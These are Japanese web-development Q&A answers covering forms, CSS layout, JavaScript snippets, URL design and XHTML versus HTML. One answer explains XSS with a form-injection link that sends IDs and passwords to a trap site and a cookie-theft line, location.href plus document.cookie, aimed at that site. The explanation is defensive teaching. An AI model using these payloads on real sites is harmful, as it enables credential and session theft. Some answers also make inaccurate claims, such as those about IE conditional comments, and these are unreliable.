E1350">&nbsp;</span> 　　　　・・・とかのほうが楽でしょうね。・・classの中身は適当(後々使うかもしれないので)・・ 　　</dd> ☆HTMLの仕様では、idには ・先頭がアルファベットで始ま。 ・2文字目以降にはアルファベット、数字、ハイフン(-)、アンダースコア(_)、ピリオン(.)、コロン(:) 　class名には制限はないのですが、スタイルシートで使う場合はclass名にも ・一文字目はアルファベット、アンダースコア(_) ・二文字以降はアルファベット、数字、ハイフン(-)、アンダースコア(_) 　と言う制限が加わります。
【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから action = uri [CT] 　この属性は、フォーム処理エージェントを指定する。HTTPスキームURI以外の値の場合のユーザエージェントの動作は、定義しない。 method = get|post [CI] 　この属性は、フォームデータ集合を提出する際にどちらのHTTPメソッドを用いるかを指定する。 可能な値は、大文字小文字を区別せず、「get」(デフォルト値)と「post」である。使用法については フォームの提出の項を参照のこと。 enctype = content-type [CI] 　この属性は、(method属性値がpostの場合)サーバに提出する際のMIMEタイプを指定する。 デフォルト値は "application/x-www-form-urlencoded"である。 INPUT要素でtype="file"のものと組合せる場合は、この値に "multipart/form-data"を指定する必要がある。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Forms in HTML documents (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/interact/forms.html#h-17.3 )］より 　仕様書くらいは、一度通して読んでおきましょう。 　よって、かならず <form action="/cgi/mailForm.cgi" method="post" enctype="multipart/form-data"> 　になります。 　・デフォルトのGET(Querystring)の許容量をオーバーします。 　CGI側で、画像の処理をします。Perlが使えれば、多くの場合ImageMagickないしPerlMagickが使えますので、メールで扱える範囲内にデータを縮小するなりして送信すれば良いです。 　https://www.google.co.jp/?gws_rd=ssl#q=%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0%E3%83%A1%E3%83%BC%E3%83%AB+%E7%94%BB%E5%83%8F%E6%B7%BB%E4%BB%98+magick+OR+gd&safe=off
それはWPの仕様です。恐らく今後共、何回ver.Upしようとも相対パスになる事は無いかと思われます。 ＞WordPreaaはなぜ絶対パスなのか？ - http://blog.lowaivill.com/wordpress/wordpress-url-path/ P.S. 相対パスを使いたいのなら、自前でPHPを改造するなりして、独自のコードを吐き出す様なオリジナルの functions.php を自作する以外に方法はありません。 またxammp環境下でのWPが吐き出すURLなら、そのままweb上に移植しても "localhost" の部分がドメイン名に置き換わるだけですので。特に問題は無いかと思われますが…何か不都合が生じてるのでしょうか？
半角カナというのは昔の規格なので、 特定の目的以外では使わない、で間違いありません。 * 互換性の維持 / 例: http://www.excite.co.jp/News/bit/00091197207609.html * データ量の節約 / 例: http://wifi.yahoo.co.jp/special/april201404 ですが全角記号というものは少々事情が異なりまして... Unicode が普及した現在では、全角記号は互換性のための存在なので、 基本は半角と考えておけばよいと思うのですが... 目的によっては全角もバリバリ使います。 * 日本語組版としてベタ組みさせるために、全角 * 縦組み印刷時に横倒しをさせないために、全角 泥臭い話として、HTMLを処理するシステムの都合でどちらを使うか決まる場合もあります。 * XSS対策として、文章中の半角入力が不可能なので、全角 * バックエンドが全角半角混在ができないシステムなので、全角 * 文末の半角記号を特別処理する欧米系システムなので、半角 というわけで、 掲載するサイトにてルール化されているか確認してください / 例: http://ja.wikipedia.org/wiki/Wikipedia:表記ガイド ルールがない場合、出版を念頭に置いた日本語文章なら、全角がよいでしょう それ以外の場合は、半角がよいでしょう
＞htmlの知識だけではできないですよね？ 　できません。 　ただ、文字化けや制約、および大量のスパムメールを厭わなければ、<a href="mailto:メルアド?subject=件名">メール</a>で出来なくはないですが、 ・mail:プロトコル(手続き)には、厳しい制約があります。 　文字は原則 ASCII(アルファベットと数字、一部の記号)しか送れない。 　日本語はiso-2022jpで、ヘッダにはBASE64エンコードが必要 　一行は64文字程度(ASCII換算) 　など ・メールアドレス収集ロボットでメールアドレスを取得されます。 　よって、CGIなどのプログラムを使用する必要があります。 　ウェブサイトをお持ちでしたら、そのサービスを提供しているプロバイダーに用意されていませんか？？ 　なければ、どこからか拾ってくる。 　フォームメール CGI( https://www.google.co.jp/search?q=%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0%E3%83%A1%E3%83%BC%E3%83%AB%20CGI&hl=ja )
ローカルへの保存といっても、テキストファイルのような形でSDカードに保存するようなやり方はちょっと難しいでしょう。 そもそもWebに搭載されているJavaScriptというのは、ローカル環境へのアクセスを厳しく制限して作られています。だって、スクリプトでファイルを保存できるようになっていたら、例えばシステムの起動ディレクトリにウイルスファイルを保存したり、システムのファイルを書き換えたりできるってことでしょう？　それはあまりに危険です。 というわけで、JavaScriptのスクリプトをちょっと書き換えてローカルに保存できるようにする、という考え方は捨てて下さい。方法としては、以下の３つのいずれかがいいと思います。 1. サーバーに保存する サーバーを立ててそこにデータを送信し、保存する。そこからデータをダウンロードすることは可能です。このやり方なら、ローカルにファイルとして保存できます。ただし面倒。 2. ローカルストレージを使う JavaScriptでは、テキストに名前をつけて保存しておけます。こんな感じです。 localStorage.setItem("名前", 保存するテキスト ); これで保存したものは、ブラウザを終了した後も保存して残ります。消えたりはしません。取り出すときはこうします。 var 変数 = localStorage.getItem("名前"); これで、指定した名前で保存したテキストが取り出せます。テキストを取り出すためのページを作って、そこにアクセスして表示するようにすれば便利でしょう。個人的には一番てっとり早くておすすめ。 3. テキストを表示して手作業で保存する 新しいページを開いてテキストを表示し、それを手作業で保存する、というやり方はあるでしょう。Android 4.0以降なら、オフライン用に保存できるので、Webページとして保存しておくというやり方ができます。例えば、こんな感じ。 var newwin = window.open("", ""); newwin.document.open(); newwin.document.write( 表示するテキスト ); newwin.document.close(); これでテキストを表示したページが開かれますから、それを保存すればいいでしょう。
推奨できるかどうかはともかく、とりあえずinline <style> td div{display:inline;font-size:50%;} </style> <table border=1 cellspacing=1 cellpadding=1> <tr><td>a<DIV>50%です</DIV></td><td>b</td></tr> <tr><td>c</td><td>d</td></tr> </table>
興味があったのでちょっと調べてみました。(カテゴリがHTMLなのでWebページと仮定します。) 閲覧者は「2秒以内」であればストレスなく軽いと感じるようです。 http://web-tan.forum.impressrd.jp/e/2010/04/27/7848 理屈でいけば 最近の回線速度なら数メガあっても問題ないはずですが、サーバ処理時間やブラウザのレンダリング等もあって単純にバイト数では決まらないのが難しい処ですね。 「平均」でしたら、Web動向分析の HTTP Archive によれば、2014/7/1時点で、 1,829Kb。 (ただ動画が平均を大きく押し上げているはずなので、動画なしなら やはり数百Kb程度? ではないでしょうか) 英文ですが、いろいろ細かく見れます。 http://httparchive.org/trends.php URLを入れれば、スピード判定や遅い原因を示してくれます。 http://gtmetrix.com/ http://developers.google.com/speed/pagespeed/insights/ 「待ち時間 8秒、1ページ4～50Kb以内」といわれ、画像をドット単位で塗りつぶしていた頃とは隔世の感があります。
mailtoでできるのはメーラーをむりくり開くくらいなので ちゃんとやりたいならフォームメール的なサーバーサイドのプログラムが 必要になるでしょう
おなじページ内でよければこんな感じ？ <script> try{ document.addEventListener ('keyup',function(e){keyupfunc(e)},true); }catch(e){ document.attachEvent('onkeyup',function(e){keyupfunc(e)}); } function keyupfunc(e){ var t = (e.srcElement || e.target); if(t.nodeName=="INPUT"){ switch(t.name){ case "ans1": t.form.elements["ans5"].value=t.value; break; case "ans5": t.form.elements["ans1"].value=t.value; break; } } } </script> <form> <p> 質問１　氏名：<input type="text" name="ans1" /> 質問５　氏名：<input type="text" name="ans5" /> </p> <form>
質問1; No2さんの通り、'>"><hr> はタグが有効か簡単に確認する方法というだけで、<hr>に特に意味はありません。。 <hr>が表示される、つまり「タグや引用符が処理されていない」ということは、「そのページを改竄できる」ということを意味します。HTML部品を勝手に挿入される、といった方が分かりやすいかも知れません。 例えば、悪意者がブログで勝手にあなたのサイトを紹介し <a href="http://あなたのサイト/フォーム.php?name=></form> <form action='http://罠サイト/IDget.php'> ID<input name='id'>PASS<input name='passwd'>"> [このサイトがおすすめ] </a> こんな感じで不正なタグ入りのクエリ付きリンクを張られます。 (</form>で正規のformは無理やり終了、続いて不正なフォームを挿入している) これを誰かがクリックすると「その利用者には改竄されたあたなのサイト」が表示されます。 他 display:none 等で正規のformは非表示にされ、しかも「 URLはあなたのサイトのまま 」なので、利用者はまず気付かずに罠サイトに送信してしまいます。カード情報や個人情報だと被害は甚大です。 質問2; alert()の方も、単にJavaScriptの可否を簡単に確認する方法、というだけです。 「alert()が動作する」ということは、大抵「JavaScriptの挿入可」ですので例えば location.href="http://罠サイト/get.php?cookie="+document.cookie; なら分かりやすいでしょうか。悪意のサーバ宛てにその利用者のクッキーを送信してしまいます。 クッキーには自動ログインの為の値やセッションIDが入っている事が多く、なりすましに利用されます。 実際には <img src=～とかで目に見えないところで送信されたり、あるいは <script src='～/xss.js'>などで不正なJavaScriptを背後で実行されるかも知れません。 ※Q1,2共に、あなたのサイトそのものが改竄されるわけではなく、「罠リンクを踏んで来訪した利用者に、正しいURLのままで、改竄されたページが表示される」ということです。 セキュリティ本1冊目を通されることをお勧めします。 徳丸 浩氏の 「安全なWebアプリケーションの作り方」が実際の手口も掲載され理解しやすくお勧めです。
おそらく、前の方で <xx xxx="～ 等と書いてあって、そのタグを閉じた部分かと思われます。 <AA BB=".... <xxx 'zxxx'>"> みたいな感じの最後の部分。 それ単独で意味があるものではありません。
テーブルの行の高さ、なので <tr> タグに指定するのが素直でしょうか。 <style> table tr { height:1em; } /* 全ての行に適用 */ table tr.test { height:3em; } /* 特定の行のみ適用 */ </style> <table border> <tbody> <tr> <td> 1 <td> 2 <tr> <td> 3 <td> 4 <tr class=test> <td> 5 <td> 6 </table>
予め分かっている文字列なら、手動でクラスを追加する方法が確実です。 不規則な入力となるなら、jqueryの「txt.replace」を使って文字列を検知して置き換える方法があるかと。 以下はサンプルです。 <script type="text/javascript" src="jquery-1.9.1.js"></script> <script type="text/javascript"> $(function(){ $('a').each(function(){ var txt = $(this).html(); $(this).html( txt.replace(/下線あり/g,'<span>下線あり</span>') ); }); }); </script> <style type="text/css"> a {text-decoration:none;} a span {text-decoration:underline;} </style> <p><a href="index.html">下線あり</a></p> <p><a href="index.html">下線なし</a></p>
http://heo.jp/tag/font/font.html#1 http://www.tagindex.com/html_tag/text_font/font.html fontタグのsizeの最大値は7だからです。
いいえ、XHTMLもXMLです。 　HTMLを、SGMLの子孫であるXMLの文法にあわせたものがXHTMLで、それもXMLです。 　HTMLは、SGMLを参考に作られましたが、SGMLでもXMLでもありません。 XMLは、すべての要素は<element attriblue="">内容</element>になります。要素名,属性名は小文字、すべての要素はかならず開始タグと終了タグで、その内容を括らなければなりません。内容のない要素は、<element attriblue="" />とすることもできます。属性値はかならず""で括らなければなりません。 HTMLは、 ・要素名・属性名が大文字でも良いです。 ・属性の値が一つの場合でascii文字だけのときは""で括らなくても良い 　値だけ書けば良い属性もあります。<option selected> ・内容のない要素は終了タグが不要　<br><img><link> と随分と簡単になっています。 <link rel="apple-touch-icon-precomposed" href="[URL]"> はHTMLとしては正しいのですが、XMLでは解析エラーですので <link rel="apple-touch-icon-precomposed" href="[URL]"></link> または、 <link rel="apple-touch-icon-precomposed" href="[URL]" /> としなければなりません。 　ところがブラウザによると、<link rel="apple-touch-icon-precomposed" href="[URL]"></link> 　は解釈できませんので、 <link rel="apple-touch-icon-precomposed" href="[URL]" /> 　が必然的に唯一の選択肢になります。 　⇒HTMLからXHTMLへ（基礎知識）( http://www.w-frontier.com/xhtml.html ) 　XHTML(Extensible HyperText Markup Language)は、文法に厳格ですが、完全なXMLその代わりすべてが統一された文法になっていますから機械処理が容易です。ブラウザへの負担が取っても少ない。その負担の軽減でHTML以外のXML要素を任意に加えることも可能です。 　しかし、文法が厳密になるため、人の側からすると扱うのが難しく。「HTMLは4.01で終了、今後はXHTML」とW3Cがいくら笛や太鼓を叩いても普及が進みませんでした。そしてブラウザベンダーは、独自に新しいHTML5を策定し始めた。 　結果的に、W3Cも「難しすぎる技術は普及しない」と認めて、XMLの開発は中止して、HTML5を進めることになった。 　⇒HTML5が持つ本当の意味 － ＠IT( http://www.atmarkit.co.jp/news/200801/25/html.html ) ★HTMLとXHTMLの違いは、XHTMLでページを作成するときは、必須の知識ですからしっかりと確実に身につけておきましょう。 　あちこちから、ソースだけをつまみ食いしてつぎはぎしても、応用は利きません。理系科目の勉強と同じです。基礎からコツコツと積み上げていくほうが、はるかに簡単で楽で応用が利きますよ。
HTMLは <!-- コメント--> CSSは /* コメント */ それぞれにしか使えないと思います。
No.1です。 昨日は携帯からだったので失礼しました。 XUVJORSLPDTZXさんがどこまで知識があるかわからないので、知識の無い方向けにできるだけ噛み砕いて書いてますが、回りくどかったらごめんなさい。 ある程度知識のある方ならNo.2さんの解説が非常に細やかなので、勉強されるにはそちらを参考にしたほうがいいと思います。 ■まずは手っ取り早く結論から。 ●htmlには以下の通り（昨日とちょっと変えてます）。 -------- <div class="clearfix"> <div class="floatL">左</div> <div class="floatR">右</div> </div> -------- ●cssは<head>～</head>に直に記述するか、もしくは別のファイル（△△.css）にして、ヘッド内で読み込みます。 <head>～</head>に直に記述する場合は以下の通り。 -------- <style type="text/css"> <!-- .clearfix:after { content: "."; display: block; height: 0; clear: both; visibility: hidden; } .clearfix { display: inline-table; } /* Hides from IE-mac \*/ * html .clearfix { height: 1%; } .clearfix { display: block; } /* End hide from IE-mac */ .floatL {float:left;} .floatR {float:right;} --> </style> -------- 別のファイルにして、ヘッド内で読み込む場合は 別ファイルに -------- .clearfix:after { ～（中略） .floatR {float:right;} -------- <head>～</head>に -------- <link href="△△.css" rel="stylesheet" type="text/css" /> -------- △△.cssはお好きな名前にして、このhtmlからみたパスを正しく記入してください。 ■ここから下はカンタンな解説です。 最初のコード <a href="http://www.yahoo.co.jp/">左</a> <div align="right"><a href="http://www.yahoo.co.jp/">右</a></div> ここで使われている<div align="right">の「div」はブロックレベル要素といって、見出し、段落など文書を構成する基本要素となるものです。これは【かたまり】の扱いなので、何も指定しないと図の紫や赤の線のように親要素に100％の幅（この場合ウインドウいっぱい）に表示されます。 目には見えなくても幅100％の箱を置いたようなもの、と理解してください。 なので図の上半分のように、「左」の下に幅100％の箱があり、その中に「右」があるので、同じ行にならないのです。 このブロックレベル要素に、cssでfloatを指定してやると、中身の幅に合わせたサイズで左寄せ、右寄せにすることができます。 今回は左のボックスにfloatL（ 水色の線）、右のボックスにfloatR （緑の線）というクラスを指定しました。 これでご要望の配置にすることはできましたが、そのままだとこの下の文章が「左」と「右」の間に流れ込んでしまいます。 そこでこの二つをもうひとつのdivでくくり、clearfixというクラスを指定して、floatを解除しました。 clearfixにはいろんな書き方があって、今回のはその一例です。 こういう場で書かれた解答をそのまま真似して終わるより、カンタンにでもその理屈を理解したほうがその後の役に立つと思います。 私の解説はザックリ過ぎですから、きちんと勉強されるならNo.2さんの解説などを参考にされてください。
getElementsByName をつかえば、どの要素に name 属性をつけても対処できますが、 やりたい事を実現するならば、以下はいかがでしょうか。 <form> <div><input type=hidden name=hoge value=ほんげ><span>ほんげ</span></div> </form> function DOM操作して値を書き換え(フォーム){ var hoge = フォーム.elements['hoge']; hoge.value = 'ほんげぇぇぇぇ'; hoge.nextElementSibling.textContent = 'ほんげぇぇぇぇ'; }
末尾が / の URL が要求された場合 Webサーバーが Apache で静的ファイルを表示するなら、 このモジュールが表示するファイルを決定します http://httpd.apache.org/docs/2.4/mod/mod_dir.html Webサーバーが mod_rewrite などで URL を書き換えるなら、 書き換えた先の CGI なり PHP なりが実行され、その結果が表示されます Webサーバーが Tomcat(などのJavaEEサーバー) なら、 URL にマッピングされたサーブレットが実行され、その結果が表示されます 例) http://www.javadrive.jp/servlet/webxml/index4.html 例) http://www.mkyong.com/webservices/jax-rs/jax-rs-path-uri-matching-example/ つまり外部から見ただけでは構成は不明です。 回答1. 個人的には REST の流行が一番の原因だと思います。 http://ja.wikipedia.org/wiki/REST この哲学にしたがえば URL は「リソースを一意に識別する汎用的な構文」 であることを求められますので、 良) http://www.example.com/category/ ← category・引数なし、のリソースを表す 悪) http://www.example.com/category.php ← 拡張子は唯のシステム都合なので邪魔 悪) http://www.example.com/category/index.html ← いわずものがな この哲学が浸透したので、検索エンジンもこの形式を好むようになり、 SEO に有利という風潮が生まれたのかと推測します。 回答2. URL の仕様的には、以下はすべて正常です。 http://www.example.com/category.php?id=hoge http://www.example.com/category/?id=hoge 余談ではありますが http://allabout.co.jp/gm/gc/23887/
　社内で同じネットワーク上で同じ(MUA Mail User Agent)を使ってなら出来なくもないですが、それでもsendmail、qmailなどメールサーバー(MTA Mail Transfar Agent)は最低限必要です。 　⇒Sendmail - Wikipedia( http://ja.wikipedia.org/wiki/Sendmail ) 　⇒qmail - Wikipedia( http://ja.wikipedia.org/wiki/Qmail ) いずれも、UNIX系のOS対象ですから、ネットワーク上にWindowsしかなければ 　⇒Microsoft Exchange Server - Wikipedia( http://ja.wikipedia.org/wiki/Microsoft_Exchange_Server ) を利用することになります。 　しかし、MTAを用意するのでしたら、ついでにPerlなどもインストールしてCGIを組むべきです。そうすると、OSの違いやMUAの違いを気にしなくて良くなります。
こんな感じでJavaScriptでiframeのsrcを順番に書き換えていけばいいのではないでしょうか。 <script> var ifid = 0; var ifurl = [ "http://www.yahoo.co.jp/", "http://www.watch.impress.co.jp/", "http://www.excite.co.jp/" ]; function ifchange() { document.getElementById("iframe1").src = ifurl[ifid]; ifid++; if (ifid >= ifurl.length) { ifid = 0; } } </script> <button onclick="ifchange();">ぼたん</button> <iframe id="iframe1" style="width:200px; height:100px;"></iframe>
やりようはありますが、漠然とした質問にはぼんやりした回答しかできません。 具体にはjavascriptを使う、リダイレクトをつかう、シンボリックリンクを使う、cronを使う、プッシュを使う、フィードをつかう、XMLを… どの方法が使えるか、実装しやすいかは、状況によるので一般論で答えることはできません。もしどうしても知りたい場合はblogのアドレスを公開してください。。
さすがに分からん。 今まで機能していた。のなら、その時点から現段階のどこかで間違いがあるんでしょう。 少しずつ戻して、どこでミスしたのか確認しましょう。
あなたの得た情報はすべて嘘、出鱈目・・・。 どうしてそんな無茶な話になるのか分かりません。 あなたが実際に、googleなどで何かを探したとします。例えば、"コガネムシ科 成虫 金属光沢"( https://www.google.co.jp/search?q=%E3%82%B3%E3%82%AC%E3%83%8D%E3%83%A0%E3%82%B7%E7%A7%91%20%E6%88%90%E8%99%AB%20%E9%87%91%E5%B1%9E%E5%85%89%E6%B2%A2&hl=ja ) 　あなたの調べた条件に適合するURLなんてないはずです。 　そうではなく、管理しやすいようにきちんとディレクトリ構成で整理するほうが良いです。例えば /　ルート |-- index.html |-- images/ ルート以下で共通に使用する画像 |　　　|-- icon/ |　　　|-- logo/ |　　　|-- photo/ |-- cooking/ |　　　|-- curry/ |　　　|　　　|-- index.html |　　　|　　　|-- images/　　curryディレクトリ以下で使用する画像 |　　　|　　　|-- recipe/ |　　　|　　　　　　|-- index.html |　　　|-- images/ cooking 以下で使用する画像 |-- article |　　　|-- と言う風にね。 　階層の数（ディレクトリの深さも文字数）も一切関係ありません。 ＞拡張子（「.html」等）に関しては、付けない方が良いという記事があったので、 　これも間違い。HTTPサーバーは拡張子がない場合に、探し回ります。 1) それがファイルか・・ 　ファイルだったらそれを提供します。デフォルトはテキストですから・・ 　ディレクトリだったら、それを開いてみます。 　　開いてDIRECTORY_INDEXに指定されているファイルの有無を探します。 　　　・それがあればそれを提示します。 　　　・なければ、(許可していれば)ディレクトリのファイル一覧を提出します。 2) それもなかったら、/以下を環境変数(PATH_INFO)に格納して上位のディレクトリを調べます。 　　・・以下同様・・・繰り返し 　という大変な（でもないけど）負担をかけるので、きちんとファイル名を全部指定すべきです。拡張子は、HTMLでしたら、.html、.htmなどにして置きます。無条件でHTMLファイルとして提供してくれます。 ★数年後、10年後にあなた自身でメンテナンスしなければならなくなったときに楽なようにするのが最善です。検索エンジンは単純なロボットですから、階層とか文字数とかは一切苦にしません。 ＞他のサイトにリンクを貼って頂けた場合、URLを明示してリンクして頂く場合が多いと思うのですが、 　そんなことありません。ポインターを乗せればステータスバーにURLは表示されますので、わざわざ書いたりしません。読みづらくなるだけです。W3Cの仕様書だって、リンク先のURLなんて書かれていません。 　⇒HTML 4.01 Specification (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/cover.html ) 　この掲示板(okweb/教えてgoo)は、システム上そうなっているだけです。それよりは <a href="http：//www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/cover.html"> あっち</a> じゃなくて、<a href="http：//www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/cover.html">HTML 4.01 仕様書邦訳</a> のように、リンク先の具体的な名称を書くべきとされています。 　⇒212. <A> のアンカーとして `ここ` などを使うのは好ましくありません。( http://www.htmllint.net/html-lint/explain.html#here-anchor ) ★きちんと階層など気にせず、メンテナンスしやすいようにディレクトリ整理しましょう。 ★ファイル名.拡張子まできちんと指定しましょう。
別オリジンの画像等が含まれていないのなら SVGのforeignObject要素内に入れてCanvasに貼り付ければいいです http://note.chiebukuro.yahoo.co.jp/detail/n181297 もしくはflag有効のChromeならWebRTCでスクリーンキャプチャができます。
あまり、詳しくはないのですが、知っている範囲で、書きます。 <!DOCTYPE html> は、このブラウザのテキストのタイプは　「html」ですと宣言しています。 <!--[if lt IE 7]> 　　　 <!-- で始まり 　　　--> で閉じで使います。 この中に書かれているのは、該当ソースの覚書メモのようなもので、ブラウザ上には表示されません 上の場合は「if lt IE 7」となっているので、ブラウザがIEつまり（インターネットエクスプローラ）が7のバージョンの時にはという意味合いです。 例の場合はIEが７のバージョンの時は「html classにあるコードを参照。[endif]というのはjava script の構文でこれで終わりの意味です。 htmlに、cssのコードを入れるとき、IEのバージョンによって、表示が異なるので、それぞれを表記してあげる必要があります。 コードの順番を間違うと、文字化けしたり、きれいに表示されなかったりすることになります。 ブラウザがいろいろ増えてバージョンも増えてきて、CSSは、一つずつについて書く必要があるので、こういう長いものになっています。
＞以前ここで3カラム左右可変をやり方を教えていただいたのですが、うまく出来なかったので 　私には記憶ないのですが。 　当初のこちら（左右固定の３カラム）で・・初心貫徹 ＞HTML5(大文字)で作りたいが、JSだと重いのでHTML4.01ということ？ 　video要素やSVGを使わず単に、header,sectionのような新しい要素だけでしたら重くはありません。問題にするとしたらjavascriptが無効なときだけでしょう。 　HTML5を使わずHTML4.01を使用するのは、 ・後方互換（古いブラウザへの対応も考慮しなければならない）のときです。だとしたら@media screen andのようなCSS3を用いるのは矛盾します。 　しかも、. header{}とか、#なんとか{}など、CSS1のものがそのままだったり 「HTML5は未勧告で確定していないことや後方互換を考えてHTML4.01+CSS2.1で製作する」 という条件で説明します。ちょっと厳しいかもしれませんが、あなたのためになると思って書きます。 　残念ながら、基本がまったく出来ていません。HTML4.01+CSS2.1を使われるならまず両方の仕様書だけはかならず目を通してください。すべてを一度に理解するのは無理ですし無駄ですが、すくなくともどこに何が書いてあるくらいは知っておくこと。 ・HTML 4.01 仕様書邦訳( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/cover.html ) ・CSS 2.1仕様（日本語訳）( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/cover.html ) 　ここからはリンク先も見ながら読み進めること 　最も重要な事は「構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.4.1 )」です。HTMLには文書構造しか書かずにプレゼンテーション(表現)はスタイルシートに任せるという事です。そのためにスタイルシートを使うのです。 　→14.1 スタイルシートの概説( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/present/styles.html#h-14.1 ) 1) まず、デザインは一切考えずに文書構造だけをマークアップします。HTML4.01ではHTML5のような文書構造を示す要素がありませんからDIVやSPANを使います。 　『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4 )』 　それ以外の目的(主にデザイン)で使用したり、文書構造としては意味不明のclass名(clear_fixとか・・)やidつけたり。 　HTML5“とか”アプリ開発入門（1）：Webの3つの問題を解決する「HTML5」とは何なのか (2/2) - ＠IT( http://www.atmarkit.co.jp/ait/articles/1008/30/news106_2.html )のページの真ん中あたり「【問題2】文書内に埋め込まれた「意味」が不明確」 　HTML5ではこの問題を解決するために新しい要素( http://standards.mitsue.co.jp/resources/w3c/TR/html5-diff/#new-elements )が追加されます。 　 HTMLの<body>内 <body> 　<div class="header"> 　　<h1>ページタイトル</h1> 　</div> 　<div class="section"> 　　<h2>本文</h2> 　　<p>本文記事</p> 　　<div class="nav"> 　　　<h3>ナビゲーション</h3> 　　　<p>画像がコンテンツの主要な要素でない場合は背景にします。</p> 　　</div> 　　<div class="aside"> 　　　<h3>補足記事</h3> 　　　<p>本文とは直接関係ない--asideな--記事</p> 　　</div> 　</div> 　<div class="footer"> 　　<h2>文書情報</h2> 　</div> </body> 　というHTMLをまず書きます。デザイン考えてないのでメンテナンス楽ですね。 　HTML5だと、それぞれ、<header><header><section></section><aside></aside><nav></nav><footer></footer>になります。用途もあわせてあるので、将来HTML5にするときは、そのまま書き換えればよい。 　当初の予定通りスタイルシートを書いていきます。 html,body{margin:0;padding:0;}/* 余白消しておく */ h1,h2,h3,h4,h5,h6{margin:0;line-height:1.6em;} p{text-indent:1em;} div.header,div.section,div.footer{ width:100%;/* ウィンドウ幅に合わせる。 */ min-width:630px;max-width:1000px;/* 最小(スマホ)、最大(幅広ディスプレイ) */ margin:0 auto;/* 幅がウィンドウ幅より狭いときは中央 */ padding:5px;/* ボックス内の余白 */ } div.section{ position:relative;/* 子孫要素の基準とするため */ min-height:400px;/* 一応目次(nav)や補足記事(aside)のための最小高さ */ } div.section>*{ margin:0 100px;/* navとasideのスペース */ } div.section div.nav,div.section div.aside{/* 本文内のこれらは */ position:absolute;/* 絶対配置、staticでない直近の親を基準 */ top:0; width:100px;/* 幅を指定 */ height:100%;/* 本文高さ一杯 */ margin:0; } div.section div.nav{ left:0; } div.section div.aside{ right:0; } /* 分かりやすいように色分け */ div.header{background-color:aqua;} div.section{background-color:silver;} div.nav{background-color:lime;} div.aside{background-color:white;} div.footer{background-color:fuchsia;} たったこれだけです。 ★セレクタはかならず基点となるセレクタ書きましょう。 　『単体セレクタは型セレクタもしくは 全称セレクタのいずれかの直後に、( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/selector.html#selector-syntax )』 ★class名に日本語は使えません。 　セレクタに使用できる文字はアルファベット、数字、ハイフン(-)、アンダースコア(_)が使用可能で1文字目にはハイフンと数字は使用できません。 ★mediaqueryを使うのは、あくまでリキッドでデザインしてそれ以上の対応をしたいときです。 　よって /* 必要なら小さい画面用に下記を追加 */ @media screen and (max-width: 640px) { div.section{ min-width:0; min-height:0; } div.section div.nav,div.section div.aside{ position:static; display:inline-block; width:48%; } div.section>*{ margin:0; } } @media screen and (max-width: 480px) { div.section div.nav,div.section div.aside{ position:static; display:block; width:100%; } }
postmail.cgiというのが http://www.kent-web.com/mail/postmail.html これであれば、 http://www.kent-web.com/pubc/kitei.html 「Powered by」という言葉の代わりに「copyright」という言葉を入れなければなりません。 お金を出す代わりに広告をして利用者に宣伝するわけですから、 著作権表記も広告表示もしたくなければ、一番早いのは業者にお金を出して作ってもらう事です。 https://support.google.com/docs/answer/87809?hl=ja Googledocsでフォームを作ってみてはいかがでしょうか。 URLがgoogleになると思いますのでgoogleを利用している事がわかりますが、ページ内にはgoogleの著作権表記も他社の広告も入らないと思います。 （Google Adsenceが入るかもしれませんが、確認してください。） Googleのサービスは基本的にアクセスデータをサービス利用の対価としていますので、誰か（何か）を宣伝しなくていいです。
このあたりを参考にしてはいかがでしょう。 http://devadjust.exblog.jp/16866976 http://lab.sonicmoov.com/development/javascript/input-type-file/ リンク先でも説明がありますが javascriptでinput type="file"をクリックするという動作を設けても IEでは動かないのでご注意を！
<style type="text/css"> th { font-weight: normal; } </style>
厳密に決められているわけではないと思います。 特に個人の趣味の範囲でのWebページで使用するものは、Facebookに限らず自由なものが多いのではないでしょうか。 （実際に、FacebookやTwitterのロゴの作り方をレクチャーしているWebサイトもありますので…） ただ、こちら（https://www.facebookbrand.com）を見てみると、Facebookのブランドイメージを変えたり損なったりするようなこと は止めておいたほうが無難な気がします。 Facebookが公式で配布しているロゴもありますし、Facebookが青をブランドカラーをしているなら、それに従っておいたほうがお互いにいいのではないでしょうか。 こちらから利用規約も確認できるので、一度目を通しておくといいかもしれません。 https://www.facebook.com/policies/
＞もしa,b,cだけではなく、結構数の多い場合は 定型処理はリストをつくっておいてforeachなどで回せばよいでしょう $elements=array("a","b","c"); foreach ($elements as $val){ if(isset($_POST[$val])) $_SESSION[$val]= $_POST[$val]; }
　フレームワークの最大の問題点は、文書構造とプレゼンテーションの分離と言うHTML/CSSの最大の目的が果たされない事です。 ★構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.4.1 ) 　プレゼンテーションのために、HTMLが書かれてしまいますから、HTMLの内容を変更したり、デザインを変更したいというときに困ったことになります。 　フレームワークを使うということは発想はDTP( http://ja.wikipedia.org/wiki/DTP )と同じですが、HTMLとDTPはまったく逆の発想です。HTMLはSGMLから派出したもので、基本は 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 電子文書は特定の企業のワープロソフトを用いるとそのソフトのバージョンが上がったり、最悪の場合そのソフトを開発している会社が開発を中止したり、倒産したりしてソフトウェアが無くなった場合は、今まで作成したデータが読めなくなるという問題が発生してしまう。そこで、プレーンテキストのみを用いて、「タグ」を使うことによってデータに意味を持たせることが考えられた。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Standard Generalized Markup Language - Wikipedia( http://ja.wikipedia.org/wiki/Standard_Generalized_Markup_Language )］より 　